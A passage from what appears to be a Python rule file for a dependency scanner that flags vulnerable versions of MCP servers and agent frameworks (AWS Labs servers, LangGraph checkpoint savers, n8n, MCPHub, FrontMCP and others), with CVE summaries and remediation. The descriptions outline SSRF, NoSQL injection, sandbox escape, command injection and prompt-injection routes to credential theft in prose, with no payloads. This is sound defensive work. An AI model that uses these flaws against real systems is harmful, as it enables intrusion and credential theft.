    "The AWS API MCP Server (`awslabs.aws-api-mcp-server`) from 0.2.13 through "
    "1.3.46 improperly handles a startup initialization failure: when the security "
    "policy enforcement data fails to initialize, the policy check is skipped for "
    "the entire lifetime of the process, so an actor can execute AWS API operations "
    "the user-configured policy was set to deny or gate. The IAM permissions on the "
    "configured credentials still apply, but the extra deny/gate layer the operator "
    "relied on is silently absent (CVE-2026-16584, CVSS 7.0). Fixed in 1.3.47; "
    "treat 0.2.13–1.3.46 (and unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `awslabs.aws-api-mcp-server` to >= 1.3.47 and pin it. Fail the server "
    "closed when security-policy initialization fails rather than continuing with "
    "policy enforcement disabled, and scope the configured IAM credentials to the "
    "minimum operations required.",
    sarif_name="AwsApiMcpServerPolicyBypass",
    cve_references=["CVE-2026-16584"],
    owasp_mcp_references=["MCP02:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `awslabs.aws-api-mcp-server` in requirements*.txt at any depth and, "
        "at the project root only, in pyproject.toml, Pipfile, package.json, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock "
        "lockfiles, reporting a range that admits an affected version and a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)


_r(
    "AAK-MCP-AMAZONMQ-CVE-2026-18655-001",
    "Amazon MQ MCP Server broker-hostname SSRF exfiltrates credentials/tokens (< 2.0.24)",
    "The Amazon MQ MCP Server (`awslabs.amazon-mq-mcp-server`) before 2.0.24 does not "
    "restrict the broker hostname its RabbitMQ broker-connection tools connect to, so "
    "a remote unauthenticated actor who injects a crafted broker hostname into the MCP "
    "client context (via prompt injection) can make the server send the Amazon MQ for "
    "RabbitMQ broker credentials or OAuth access tokens to an attacker-controlled "
    "endpoint (CVE-2026-18655; CVSS 4.0 7.1 / 3.1 6.5). Fourth awslabs.*-mcp-server pin "
    "in this family. Fixed in 2.0.24; treat < 2.0.24 (and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `awslabs.amazon-mq-mcp-server` to >= 2.0.24 and pin it. Restrict the broker "
    "hostname the RabbitMQ connection tools may reach to an allow-list, and never "
    "forward broker credentials / OAuth tokens to a caller-influenced endpoint.",
    sarif_name="AmazonMqMcpServerBrokerHostnameSsrf",
    cve_references=["CVE-2026-18655"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `awslabs.amazon-mq-mcp-server` in requirements*.txt at any depth and, "
        "at the project root only, in pyproject.toml, Pipfile, package.json, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)


_r(
    "AAK-MCP-LANGGRAPH-MONGO-CVE-2026-48121-001",
    "LangGraph MongoDB checkpoint saver NoSQL injection leaks checkpoints across tenants (< 1.3.1)",
    "`@langchain/langgraph-checkpoint-mongodb` (the LangGraph.js MongoDB "
    "CheckpointSaver) at 1.3.0 and below passes checkpoint identifiers "
    "(`thread_id`, `checkpoint_ns`, `checkpoint_id`) from `config.configurable` "
    "into MongoDB `find()` queries in `MongoDBSaver.getTuple()` without type "
    "enforcement. An attacker who supplies an object payload (e.g. the MongoDB "
    "operators `$gt` / `$ne`) instead of a string has it interpreted as a query "
    "operator, bypassing thread scoping and leaking checkpoints, including pending "
    "writes, across tenants (CVE-2026-48121, CVSS 6.7). Fixed in 1.3.1; treat "
    "<= 1.3.0 (and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `@langchain/langgraph-checkpoint-mongodb` to >= 1.3.1 and pin it. "
    "Coerce checkpoint identifiers from `config.configurable` to strings before "
    "they reach a MongoDB query, so an object payload can never be read as an "
    "operator.",
    sarif_name="LangGraphMongoCheckpointNosqlInjection",
    cve_references=[
        "CVE-2026-48121",
        # 2026-09-14: CVE-2026-55253 (HIGH 7.7) is the same defect in the PyPI
        # distributions rather than the npm one -- MongoDBSaver.list/alist and
        # MongoDBStore.search fold a caller-controlled filter dict into the
        # query without recursively rejecting `$`-prefixed keys. Fixed in
        # langgraph-checkpoint-mongodb 0.3.0 and langgraph-store-mongodb 0.4.0,
        # both now pinned, because the npm pin could not see either package.
        "CVE-2026-55253",
    ],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    limitations=(
        "Reads `@langchain/langgraph-checkpoint-mongodb`, "
        "`langgraph-checkpoint-mongodb` and `langgraph-store-mongodb`, each against "
        "its own fix floor, in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`) or in a lockfile format the reader "
        "does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, "
        "is not read."
    ),
)


_r(
    "AAK-MCP-DOCUMENTDB-CVE-2026-18954-001",
    "AWS Labs DocumentDB MCP Server aggregation-pipeline authorization bypass (< 1.0.12)",
    "`awslabs.documentdb-mcp-server` before 1.0.12 has incorrect authorization in "
    "its aggregation-pipeline tool: write-capable pipeline stages bypass the "
    "read-only-mode enforcement, so an authenticated MCP client can perform "
    "inappropriate write operations on the connected database (CVE-2026-18954, "
    "CVSS 5.5). A pinnable PyPI artifact (latest 1.0.14) the pin scanner resolves "
    "from `requirements.txt` / `pyproject.toml` / `uv.lock` / `.mcp.json`; the "
    "fifth pin in the existing `awslabs.*-mcp-server` family.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `awslabs.documentdb-mcp-server` to >= 1.0.12 and pin it. Do not rely "
    "on read-only mode alone; confirm the server rejects write-capable aggregation "
    "stages when a client is scoped read-only.",
    sarif_name="DocumentDbMcpAggregationAuthzBypass",
    cve_references=["CVE-2026-18954"],
    owasp_mcp_references=["MCP02:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    limitations=(
        "Reads `awslabs.documentdb-mcp-server` in requirements*.txt at any depth "
        "and, at the project root only, in pyproject.toml, Pipfile, package.json, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)


_r(
    "AAK-MCP-FRONTMCP-CVE-2026-67531-001",
    "FrontMCP sandbox escape via Zod schema proxy reaches RCE (< 1.5.7)",
    "`frontmcp` before 1.5.7 exposes live host Zod schema instances to the "
    "sandboxed `codecall:execute` tool through `getTool()`; because Zod v4's "
    "`_zod` is a non-configurable, non-writable own property, the Proxy invariants "
    "force the security membrane to return the raw host object, letting a script "
    "reach `_zod.constr.constructor` (the host Function constructor) and run "
    "arbitrary code as the server user. One `tools/call` is sufficient, and the "
    "framework's default public auth mode serves it to unauthenticated callers "
    "(CVE-2026-67531). A pinnable npm artifact (latest 1.6.0) the pin scanner "
    "resolves from `package.json` / lockfiles / `.mcp.json`.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `frontmcp` to >= 1.5.7 and pin it. Do not run the code-execution tool "
    "in public auth mode; require authentication and treat tool output / fetched "
    "content as untrusted so an indirect prompt injection cannot trigger it.",
    sarif_name="FrontMcpZodSandboxEscapeRce",
    cve_references=[
        "CVE-2026-67531",
        # 2026-09-15 wave. CVE-2026-59973 (HIGH 8.5): the OpenAPI adapter's
        # external-$ref guard compares hostname strings without resolving or
        # pinning addresses, revalidating redirects, or normalising IPv4-mapped
        # IPv6, so an importable spec reaches loopback and private networks.
        # Fixed at 1.5.0 for both `frontmcp` and `@frontmcp/adapters` — at or
        # below this 1.5.7 floor, so no floor move; the pin gained the
        # `@frontmcp/adapters` name it was missing. The `mcp-from-openapi`
        # half runs a 2.x line and has its own rule.
        "CVE-2026-59973",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-RCE-01"],
    limitations=(
        "Reads `frontmcp` and `@frontmcp/adapters` in package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the package-lock.json, "
        "pnpm-lock.yaml and yarn.lock lockfiles at the project root only, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`) or in a lockfile format the reader "
        "does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile "
        "over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-LANGGRAPH-CHECKPOINT-CVE-2026-71433-001",
    "LangGraph Postgres/SQLite checkpoint saver cross-tenant namespace leak (< 3.1.1)",
    "`langgraph-checkpoint-postgres` and `langgraph-checkpoint-sqlite` before 3.1.1 "
    "persist hierarchical namespaces as a dot-joined string and scope reads by "
    "matching that string as a simple prefix pattern. A read scoped to one namespace "
    "can therefore also match a sibling namespace whose flattened form shares the "
    "same leading characters, or a label containing unescaped pattern metacharacters, "
    "so an authenticated caller retrieves another tenant's stored items through an "
    "ordinary scoped search or `list namespaces` call, with no crafted input "
    "(CVE-2026-71433, CVSS 5.3). Fixed in 3.1.1; the Postgres/SQLite sibling of the "
    "langgraph-checkpoint-mongodb checkpoint leak. Treat < 3.1.1 (and unpinned) "
    "as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `langgraph-checkpoint-postgres` / `langgraph-checkpoint-sqlite` to "
    ">= 3.1.1 and pin them. Store and match namespaces as structured, escaped "
    "segments (not a prefix over a flattened dot-joined string) so a scoped read "
    "cannot spill into a sibling namespace.",
    sarif_name="LangGraphCheckpointNamespaceLeak",
    cve_references=["CVE-2026-71433"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    limitations=(
        "Reads `langgraph-checkpoint-postgres` and `langgraph-checkpoint-sqlite` in "
        "requirements*.txt at any depth and, at the project root only, in "
        "pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`) or in a lockfile format the reader "
        "does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, "
        "is not read."
    ),
)


_r(
    "AAK-METAADS-CVE-2026-48039-001",
    "Meta Ads MCP forwards unauthenticated requests and leaks the access token (< 1.0.109)",
    "`meta-ads-mcp` before 1.0.109 has `AuthInjectionMiddleware.dispatch()` "
    "unconditionally forward unauthenticated Streamable-HTTP requests to downstream "
    "MCP tool handlers without a 401, so any network-reachable caller invokes tools "
    "unauthenticated. With no per-request credential the handlers fall back to the "
    "`META_ACCESS_TOKEN` env var, and when the downstream Meta Graph API call fails "
    "the raw `httpx` request URL — including the operator's `access_token` query "
    "parameter — is serialised into the JSON-RPC response, delivering the credential "
    "to the unauthenticated caller (CVE-2026-48039, CVSS 9.1). Fixed in 1.0.109; "
    "treat < 1.0.109 (and unpinned) as exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `meta-ads-mcp` to >= 1.0.109 and pin it. Require per-request "
    "authentication and return 401 when it is absent; never echo an outbound request "
    "URL (which carries `access_token`) into a tool response, and scrub credentials "
    "from error paths.",
    sarif_name="MetaAdsMcpNoAuthTokenLeak",
    cve_references=[
        "CVE-2026-48039",
        # 2026-09-15 wave. CVE-2026-54549 (HIGH 8.3): upload_ad_image passes an
        # attacker-controlled image_url to try_multiple_download_methods(),
        # where httpx.AsyncClient has follow_redirects=True and validates
        # neither scheme, host nor resolved IP, and Meta credential validation
        # runs only after the download — so any non-empty authorization value
        # reaches loopback, private-network and metadata endpoints. Fixed
        # 1.0.115, ABOVE the previous 1.0.109 floor, which is why the floor
        # moved rather than the CVE simply being recorded.
        "CVE-2026-54549",
    ],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `meta-ads-mcp` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock and uv.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)


_r(
    "AAK-MCP-GOOGLESEARCH-CVE-2026-19337-001",
    "adenot mcp-google-search SSRF via the read_webpage url argument (<= 0.3.1, no fix released)",
    "`@adenot/mcp-google-search` up to and including 0.3.1 has server-side request "
    "forgery in its `read_webpage` tool (`src/index.ts`): the `url` argument is "
    "fetched without validating the host or scheme, so an indirect prompt injection "
    "can steer the server to fetch attacker-chosen internal endpoints (cloud "
    "metadata, loopback admin ports, RFC-1918 hosts) and return the response "
    "(CVE-2026-19337, CVSS 5.3). The affected artifact is the scoped npm package "
    "`@adenot/mcp-google-search` (versions 0.1.0–0.3.1, latest 0.3.1); the unscoped "
    "`mcp-google-search` (latest 1.0.0) is an unrelated package and is not pinned. "
    "No patched release is published yet — the upstream fix (commit `f071d491`) is "
    "unreleased — so every published version is treated as exposed (presence-only "
    "pin). Same SSRF-via-tool-argument shape as the astrbot MCP-test-endpoint pin.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Remove or replace the `@adenot/mcp-google-search` `read_webpage` server until a "
    "fixed release ships. If it must run, put it behind an egress allow-list that "
    "blocks loopback / link-local / metadata / RFC-1918 targets, and validate the "
    "`url` scheme and host before fetching. Re-pin to the fixed version once upstream "
    "publishes a patched release.",
    sarif_name="AdenotMcpGoogleSearchReadWebpageSsrf",
    cve_references=["CVE-2026-19337"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `@adenot/mcp-google-search` in requirements*.txt at any depth and, at "
        "the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, and "
        "reports every version, a future fixed one included, until the pin gets a "
        "floor. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)


_r(
    "AAK-MCP-GRAFANA-CVE-2026-19516-001",
    "Grafana mcp-grafana SSRF via caller-controlled X-Grafana-URL destination (< 1.1.0)",
    "`mcp-grafana` before 1.1.0 lets a caller-supplied `X-Grafana-URL` request header "
    "control the destination of the server's outbound requests, and the "
    "`grafana_api_request` tool lets the caller also choose the HTTP method, path, and "
    "body. Because the destination is not restricted to the configured Grafana "
    "instance, a caller can point requests at internal, loopback, and link-local "
    "services (including cloud metadata endpoints) and read the responses: server-side "
    "request forgery (CVE-2026-19516, CVSS 9.1). This is the incomplete-fix follow-up "
    "to CVE-2026-15583, whose fix stopped the configured service-account token from "
    "being sent to unintended destinations but did not restrict the destinations "
    "themselves, so the correct control is destination restriction, not token handling. "
    "mcp-grafana is a Go server but ships a resolvable PyPI wrapper (`uvx mcp-grafana`), "
    "so the pin scanner resolves it from `.mcp.json` / `requirements.txt` / "
    "`pyproject.toml` / `uv.lock`; the archived ledger note that it was unpinnable is "
    "now superseded. Fixed in 1.1.0, which restricts the destination to the configured "
    "instance.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-grafana` to >= 1.1.0, which restricts outbound requests to the "
    "configured Grafana instance. Do not let a caller-controlled `X-Grafana-URL` header "
    "choose the destination, and do not expose `grafana_api_request` to untrusted "
    "callers.",
    sarif_name="McpGrafanaXGrafanaUrlSsrf",
    cve_references=["CVE-2026-19516", "CVE-2026-15583"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `mcp-grafana` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). The `grafana/mcp-grafana` image tag is not read, in a compose "
        "file or in an MCP config that starts it with `docker run`. A file over 2 "
        "MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-N8N-CVE-2026-72768-001",
    "n8n < 2.35.4 / 2.36.x < 2.36.2 (MCP Client SSRF bypass, node-schema loader "
    "RCE, cross-project credential reference, inline sub-workflow credential "
    "exfiltration)",
    "Three MCP-surface defects in `n8n`, carried by one pin because they share a "
    "package and the highest fix version covers all of them. Before 2.32.1 the MCP "
    "Client node bypasses server-side-request-forgery protection: an authenticated "
    "user crafts a workflow whose MCP Client requests reach internal or blocked "
    "hosts and reads their responses back through the workflow (CVE-2026-72768). "
    "Before 2.33.4, and on the 2.34.x line before 2.34.1, the `@n8n/workflow-sdk` "
    "node-schema loader used for MCP node-schema loading derives a schema module "
    "path directly from the attacker-supplied node type string with no "
    "path-traversal validation, so a `global:member` user reaches code execution in "
    "the n8n main process (CVE-2026-77068). Before 2.34.1 the MCP "
    "`create_workflow_from_code` tool skips credential validation when the "
    "authentication type is an expression, letting a holder of a valid MCP Bearer "
    "API key persist unauthorized cross-project credential references "
    "(CVE-2026-77073). Before 2.35.4, and on the 2.36.x line before 2.36.2, nodes "
    "that execute an inline sub-workflow (the Workflow Tool node) accept a "
    "credential reference in their inline workflow JSON without checking that "
    "the author owns it; MCP is one of the named write paths, so a shared-workflow "
    "editor persists a node naming somebody else's credential and the secret is "
    "resolved and exfiltrated when the workflow later runs under an identity that "
    "holds it (CVE-2026-85166). A project pinning `n8n` below 2.35.4, or on "
    "2.36.0/2.36.1, or leaving it unpinned, is exposed to at least one of these — "
    "note that 2.36.0 and 2.36.1 sort *above* the 2.35.4 floor and are still "
    "affected, which is why this pin carries a second arm for the 2.36.x line. "
    "Distinct from the earlier n8n credential-domain-bypass and OAuth "
    "two-branch-fix pins the scanner already carries; this is the highest of its "
    "three n8n floors.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `n8n` to >= 2.35.4 and pin it, or to >= 2.36.2 if you are on the "
    "2.36.x line — 2.36.0 and 2.36.1 are newer than 2.35.4 and still affected, so "
    "\"at least 2.35.4\" is not sufficient on that branch. Route the "
    "MCP Client node's outbound requests through n8n's SSRF protection so a workflow "
    "author cannot reach internal or blocked hosts, and segment the n8n runner from "
    "sensitive internal services. Treat `global:member` as a privileged role until "
    "you are past 2.33.4, since the node-schema loader reaches code execution from "
    "it, and audit workflows for credential references that cross project "
    "boundaries — including inside the inline workflow JSON of sub-workflow nodes, "
    "which is where CVE-2026-85166 hides one.",
    sarif_name="N8nMcpClientNodeSsrfBypass",
    cve_references=["CVE-2026-72768", "CVE-2026-77068", "CVE-2026-77073", "CVE-2026-85166"],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `n8n` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, reporting a "
        "range that admits an affected version and a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`) or in a lockfile format the reader "
        "does not parse (a Yarn 2+ `yarn.lock`). A compose file's `n8nio/n8n` image "
        "tag is not read. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-08-27..31 CVE-response wave, deferred 2026-09-03 and shipped 2026-09-04.
# Detector: mcp_cve_pins_2026_07. Both were held under `cve-deferred` with a dated
# target and released by a registry lookup, not by the clock.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-MCPHUB-CVE-2026-79748-001",
    "@samanhappy/mcphub < 1.0.32 (eight MCP gateway authorization + SSRF defects)",
    "MCPHub is a self-hosted gateway that fronts many MCP servers behind one "
    "endpoint, so a defect in its authorization layer is a defect in every server "
    "behind it. Eight advisories landed against it in one batch "
    "(CVE-2026-79743 through CVE-2026-79750) and they are carried by one pin "
    "because they share a package and the highest fix version covers all of them. "
    "The batch is mostly missing authorization on mutating routes: "
    "`PUT /api/system-config` performs no authorization check at all (< 1.0.29); "
    "the prompt and resource controllers do no role checking on their mutating "
    "POST/PUT routes (< 1.0.32); a bearer key scoped to `servers` is accepted "
    "against a group route it should not reach (< 1.0.31); and non-admin server "
    "ownership scoping is enforced on list views and config edits but not "
    "everywhere (< 1.0.30). The remaining three are execution and egress: the "
    "`POST /api/servers` and `PUT /api/servers/:name` endpoints create MCP server "
    "entries whose command is executed (< 0.12.15, CVSS 9.9), the MCPB file-upload "
    "handler trusts the `name` field of a `manifest.json` read out of an uploaded "
    "ZIP (< 0.12.13), and the SSRF guard in `src/utils/ssrf.ts` uses a custom "
    "`isBlockedIpv6` that does not cover the address forms it needs to, so an "
    "authenticated non-admin registers a server pointing at an internal URL and "
    "reads the response back through the hub (< 1.0.32). A project pinning "
    "`@samanhappy/mcphub` below 1.0.32, or leaving it unpinned, is exposed to at "
    "least one of these. Note that PyPI `mcphub` is an unrelated project by a "
    "different author on a 0.1.x line; this rule matches the scoped npm name only "
    "and will not fire on it.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `@samanhappy/mcphub` to >= 1.0.32 and pin it — that floor clears all "
    "eight. Until you are past it, treat every authenticated MCPHub user as able "
    "to reach the mutating admin routes: put the hub behind an authenticating "
    "proxy, restrict who may create or update server entries at all (that route "
    "reaches command execution), and place the hub on a network segment with no "
    "route to internal services so the SSRF guard is not the only control.",
    sarif_name="McpHubGatewayAuthorizationBypass",
    cve_references=[
        "CVE-2026-79743", "CVE-2026-79744", "CVE-2026-79745", "CVE-2026-79746",
        "CVE-2026-79747", "CVE-2026-79748", "CVE-2026-79749", "CVE-2026-79750",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01", "ADV-SSRF-01"],
    limitations=(
        "Reads `@samanhappy/mcphub` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)


_r(
    "AAK-MCP-SEQTHINKING-CVE-2026-81845-001",
    "mcp-sequential-thinking <= 0.5.0 (session import/export path traversal)",
    "`mcp-sequential-thinking` (PyPI, arben-adm) up to and including 0.5.0 takes a "
    "`file_path` argument on the `import_session` and `export_session` tools in "
    "`mcp_sequential_thinking/server.py` and does not confine it to a session "
    "directory, so a caller reaches arbitrary paths on the host — reading files "
    "back through an import, or writing them through an export. Both are ordinary "
    "MCP tools, so the caller is whatever can drive the server, which in an agent "
    "pipeline includes anything that can steer tool selection. Fixed in 0.6.0 "
    "(patch 2fad3ee); the exploit is public. Treat <= 0.5.0 and unpinned as "
    "exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-sequential-thinking` to >= 0.6.0 and pin it. If you cannot "
    "upgrade yet, disable the `import_session` / `export_session` tools rather "
    "than relying on the caller to send a well-behaved path, and run the server "
    "as a user with no read access to anything outside its session directory.",
    sarif_name="McpSequentialThinkingSessionPathTraversal",
    cve_references=["CVE-2026-81845"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `mcp-sequential-thinking` in requirements*.txt at any depth and, at "
        "the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-CCTEMPLATES-CVE-2026-73222-001",
    "claude-code-templates < 1.29.4 (--studio server: unauth 0.0.0.0:3444 → command-injection RCE)",
    "Claude Code Templates (`claude-code-templates`), a CLI for configuring and "
    "monitoring Claude Code, before 1.29.4 launches the Claude Code Studio server "
    "(`cli-tool/src/sandbox-server.js`) via the `--studio` option bound to all "
    "interfaces on port 3444, with cross-origin requests permitted and no "
    "authentication. `POST /api/execute` passes the request-body `prompt` field to "
    "`executeLocalTask()` and `POST /api/install-agent` passes the `agentName` field "
    "to a child process; the same unsafe agent path is reachable from `/api/execute` "
    "through `checkAndInstallAgent()`. These attacker-controlled values reach "
    "`child_process.spawn()` with shell execution enabled, so shell metacharacters are "
    "interpreted as OS commands — arbitrary command execution with the developer's "
    "privileges. An attacker who can reach the port directly, or who lures a developer "
    "running Studio to a malicious website, compromises source code, credentials, and "
    "local data (CVE-2026-73222, CVSS 8.8). Fixed in 1.29.4 (the version before it is "
    "1.29.2; no 1.29.3 was published, so treat < 1.29.4 and unpinned as exposed).",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `claude-code-templates` to >= 1.29.4 and pin it. Do not run `--studio` on "
    "an untrusted network; bind the Studio server to loopback, require authentication, "
    "and reject cross-origin requests. Never pass request-body fields (`prompt`, "
    "`agentName`) into a shell.",
    sarif_name="ClaudeCodeTemplatesStudioCommandInjection",
    cve_references=["CVE-2026-73222"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `claude-code-templates` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)


_r(
    "AAK-MCP-UFO-CVE-2026-73296-001",
    "Microsoft UFO < 3.0.8 (mobile MCP servers on 8020/8021 with no authentication)",
    "Microsoft UFO, the open-source framework for intelligent automation across "
    "devices and platforms, before 3.0.8 exposes two Streamable-HTTP MCP services "
    "from `ufo/client/mcp/http_servers/mobile_mcp_server.py`: "
    "`create_mobile_data_collection_server` on TCP 8020 and "
